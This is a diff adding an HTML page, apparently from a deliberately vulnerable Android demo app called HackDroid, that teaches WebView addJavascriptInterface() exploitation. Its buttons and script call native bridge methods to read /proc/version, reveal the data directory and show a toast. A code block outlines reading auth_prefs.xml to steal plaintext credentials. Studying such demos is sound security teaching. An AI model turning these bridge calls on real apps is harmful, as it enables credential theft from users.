@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackDroid — WebView JS Bridge Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #0A0F1C;
+            color: #FFFFFF;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .header {
+            border-bottom: 1px solid #22D3EE44;
+            padding-bottom: 16px;
+            margin-bottom: 20px;
+        }
+
+        .label {
+            color: #22D3EE;
+            font-size: 11px;
+            letter-spacing: 2px;
+            margin-bottom: 6px;
+        }
+
+        h1 {
+            color: #FFFFFF;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+
+        .subtitle {
+            color: #FF6B6B;
+            font-size: 12px;
+        }
+
+        .warning {
+            background: rgba(255, 107, 107, 0.12);
+            border: 1px solid rgba(255, 107, 107, 0.4);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            color: #FF6B6B;
+            font-weight: bold;
+        }
+
+        .section-label {
+            color: #475569;
+            font-size: 10px;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            margin-top: 20px;
+        }
+
+        .description {
+            color: #94A3B8;
+            font-size: 13px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px;
+            font-weight: bold;
+            text-align: left;
+            letter-spacing: 0.5px;
+            transition: opacity 0.15s;
+        }
+
+        .btn:active { opacity: 0.75; }
+
+        .btn-primary {
+            background: #22D3EE;
+            color: #0A0F1C;
+        }
+
+        .btn-danger {
+            background: rgba(255, 107, 107, 0.15);
+            border: 1px solid rgba(255, 107, 107, 0.4);
+            color: #FF6B6B;
+        }
+
+        .btn-secondary {
+            background: #1E293B;
+            color: #FFFFFF;
+        }
+
+        .btn-icon {
+            margin-right: 8px;
+        }
+
+        .terminal {
+            background: #040810;
+            border: 1px solid rgba(34, 211, 238, 0.35);
+            border-radius: 12px;
+            padding: 14px;
+            margin-top: 20px;
+            min-height: 120px;
+        }
+
+        .terminal-header {
+            color: #475569;
+            font-size: 10px;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        #output {
+            font-size: 11px;
+            line-height: 1.6;
+        }
+
+        .line-command { color: #22D3EE; }
+        .line-output  { color: #94A3B8; }
+        .line-success { color: #22D3EE; font-weight: bold; }
+        .line-warning { color: #F59E0B; }
+        .line-error   { color: #FF6B6B; }
+        .cursor       { color: #22D3EE; }
+
+        .code-block {
+            background: #040810;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px 0;
+            font-size: 11px;
+            color: #22D3EE;
+            line-height: 1.6;
+            overflow-x: auto;
+            white-space: pre;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="label">> WEBVIEW_JS_BRIDGE_EXPLOIT v1.0</div>
+        <h1>JS Bridge Demo</h1>
+        <div class="subtitle">addJavascriptInterface() exploitation</div>
+    </div>
+
+    <div class="warning">
+        ⚠ VULNERABLE — addJavascriptInterface() enabled<br>
+        This page has full access to native Android code via the JS bridge.
+    </div>
+
+    <p class="description">
+        The Android app exposes native methods via <code style="color:#22D3EE">addJavascriptInterface(bridge, "Android")</code>.
+        Any JavaScript on this page — including from injected ads, XSS, or a redirect — can call these methods
+        to read files, access app data, or display messages.
+    </p>
+
+    <div class="section-label">ATTACK SURFACE</div>
+
+    <button class="btn btn-primary" onclick="getPackageName()">
+        <span class="btn-icon">📦</span> Android.getPackageName()
+    </button>
+
+    <button class="btn btn-danger" onclick="readSensitiveFile()">
+        <span class="btn-icon">📂</span> Android.readFile('/proc/version')
+    </button>
+
+    <button class="btn btn-danger" onclick="readDataDir()">
+        <span class="btn-icon">🗂</span> Android.getDataDir()
+    </button>
+
+    <button class="btn btn-secondary" onclick="hackToast()">
+        <span class="btn-icon">💬</span> Android.showToast('Hacked via JS bridge!')
+    </button>
+
+    <div class="section-label">HOW THE EXPLOIT WORKS</div>
+    <div class="code-block">// Any JS on the page can call native methods:
+Android.getPackageName()    // → "com.hackdroid.demo"
+Android.readFile('/proc/version')  // → kernel version
+Android.getDataDir()        // → "/data/data/com.hackdroid.demo"
+Android.showToast('msg')    // → displays Toast to user
+
+// Combined attack — read SharedPreferences:
+var dataDir = Android.getDataDir();
+var token = Android.readFile(
+    dataDir + '/shared_prefs/auth_prefs.xml'
+);
+// token now contains plaintext auth credentials!</div>
+
+    <div class="section-label">OUTPUT</div>
+
+    <div class="terminal">
+        <div class="terminal-header">TERMINAL</div>
+        <div id="output">
+            <span class="cursor">$ _</span>
+        </div>
+    </div>
+
+    <script>
+        var outputEl = document.getElementById('output');
+
+        function appendLine(text, type) {
+            var line = document.createElement('div');
+            line.className = 'line-' + type;
+            line.textContent = text;
+            outputEl.appendChild(line);
+        }
+
+        function clearOutput() {
+            outputEl.innerHTML = '';
+        }
+
+        function addCursor() {
+            var cursor = document.createElement('div');
+            cursor.className = 'cursor';
+            cursor.textContent = '$ _';
+            outputEl.appendChild(cursor);
+        }
+
+        function getPackageName() {
+            clearOutput();
+            appendLine('$ Android.getPackageName()', 'command');
+            try {
+                var pkg = Android.getPackageName();
+                appendLine('→ ' + pkg, 'success');
+                appendLine('✓ Package name retrieved via JS bridge', 'success');
+            } catch(e) {
+                appendLine('Error: ' + e.message, 'error');
+            }
+            addCursor();
+        }
+
+        function readSensitiveFile() {
+            clearOutput();
+            appendLine("$ Android.readFile('/proc/version')", 'command');
+            try {
+                var content = Android.readFile('/proc/version');
+                appendLine('→ ' + content.substring(0, 120), 'success');
+                appendLine('✓ System file read via JS bridge', 'success');
+                appendLine('⚠ Any readable file can be exfiltrated', 'warning');
+            } catch(e) {
+                appendLine('Error: ' + e.message, 'error');
+            }
+            addCursor();
+        }
+
+        function readDataDir() {
+            clearOutput();
+            appendLine('$ Android.getDataDir()', 'command');
+            try {
+                var dir = Android.getDataDir();
+                appendLine('→ ' + dir, 'success');
+                appendLine('✓ Internal data dir revealed', 'success');
+                appendLine('⚠ Combine with readFile() to steal auth_prefs.xml', 'warning');
+                var prefsPath = dir + '/shared_prefs/auth_prefs.xml';
+                appendLine('# Try: Android.readFile("' + prefsPath + '")', 'output');
+            } catch(e) {
+                appendLine('Error: ' + e.message, 'error');
+            }
+            addCursor();
+        }
+
+        function hackToast() {
+            clearOutput();
+            appendLine("$ Android.showToast('Hacked via JS bridge!')", 'command');
+            try {
+                Android.showToast('Hacked via JS bridge!');
+                appendLine('✓ Toast displayed to user from JS', 'success');
+                appendLine('⚠ JS can interact with native UI layer', 'warning');
+            } catch(e) {
+                appendLine('Error: ' + e.message, 'error');
+            }
+            addCursor();
+        }
+    </script>
+
+</body>
+</html>
